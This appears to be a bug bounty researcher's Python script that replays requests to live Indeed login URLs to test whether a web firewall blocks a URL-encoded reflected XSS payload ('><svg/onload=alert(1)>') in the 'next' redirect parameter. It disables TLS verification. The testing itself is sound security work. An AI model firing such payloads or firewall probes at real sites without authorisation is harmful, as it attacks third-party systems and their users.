"""Control test: is the 403 caused by our payload or by the client/IP?
Replay the plain (harmless) token version of the same URLs.
"""
import requests
import urllib3

urllib3.disable_warnings()
UA_BROWSER = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                            "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
UA_PD = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) "
                       "Gecko/20100101 Firefox/108.0",
         "X-BugBounty-hacker": "Hackerone"}

TESTS = [
    ("plain", "https://adh.indeed.com/user/login?next=/page/browse-metric/x"),
    ("plain-root", "https://adh.indeed.com/user/login?next=/"),
    ("root", "https://adh.indeed.com/user/login"),
    ("home", "https://adh.indeed.com/"),
    ("payload", "https://adh.indeed.com/user/login?next=abc123%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"),
    ("plain2", "https://secure.indeed.com/account/login?continue=https%3A%2F%2Faccount.indeed.com%2F"),
    ("root2", "https://secure.indeed.com/account/login"),
]

for name, url in TESTS:
    for label, hdr in (("browser", UA_BROWSER), ("pd-ua", UA_PD)):
        try:
            r = requests.get(url, timeout=20, verify=False, headers=hdr,
                             allow_redirects=False)
            print(f"{name:10} {label:8} {r.status_code} loc={(r.headers.get('Location') or '')[:60]}")
        except Exception as e:
            print(f"{name:10} {label:8} ERR {type(e).__name__}")
    print()
